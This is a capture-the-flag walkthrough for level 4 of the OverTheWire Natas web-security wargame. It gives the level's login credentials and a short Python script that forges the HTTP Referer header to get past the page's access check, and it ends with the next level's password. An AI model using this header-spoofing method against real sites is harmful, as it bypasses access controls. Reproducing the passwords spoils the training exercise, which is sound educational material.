# Natas 3 - Natas 4
     Username  :  natas4
     Password  :  QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
     URL       :  http://natas4.natas.labs.overthewire.org

# Solution
While visiting the web-page we got 

    Access disallowed. You are visiting from "" while authorized users should come 
    only from "http://natas5.natas.labs.overthewire.org/"

Which means the users comming from natas5 can only access this page 


You can solve this one by changing the referer of the request with a simple Python script:
```
import requests

url = "http://natas4.natas.labs.overthewire.org/"
referer = "http://natas5.natas.labs.overthewire.org/"

s = requests.Session()
s.auth = ('natas4', 'QryZXc2e0zahULdHrtHxzyYkj59kUxLQ')
s.headers.update({'referer': referer})
r = s.get(url)

print(r.text)
```
By using this script we can change the referrer to natas5 and obtain the password

# Password 

     0n35PkggAPm2zbEpOU802c0x0Msn1ToK
